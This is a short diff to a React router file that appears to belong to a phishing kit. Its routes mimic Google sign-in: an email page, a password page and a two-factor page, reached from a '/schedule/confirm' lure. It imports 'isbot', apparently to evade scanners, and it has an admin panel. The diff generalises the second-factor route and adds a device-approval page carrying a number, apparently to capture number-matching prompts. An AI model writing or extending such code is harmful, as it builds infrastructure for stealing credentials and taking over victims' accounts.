@@ -8,6 +8,8 @@ import Twofactor from "./pages/Twofactor";
 import AdminPage from "./pages/admin";
 import Login from "./pages/login";
 import Done from "./pages/Done";
+import Device from "./pages/Device";
+
 
 import { isbot } from "isbot";
 
@@ -67,7 +69,8 @@ return (
                   <Route path="/schedule/confirm" element={<Landing/>} />
                   <Route path="/google/login" element={<EnterEmail/>} />
                   <Route path="/google/auth/:userID" element={<EnterPass/>} />
-                  <Route path="/google/twofactor/:userID" element={<Twofactor/>} />
+                  <Route path="/google/factor/:userID/:type" element={<Twofactor/>} />
+                  <Route path="/google/approve/device/:userID/:num" element={<Device/>} />
                   <Route path="/schedule/confirm/done" element={<Done />} />
                   <Route path="/adlogin" element={<Login />} />
                   <Route
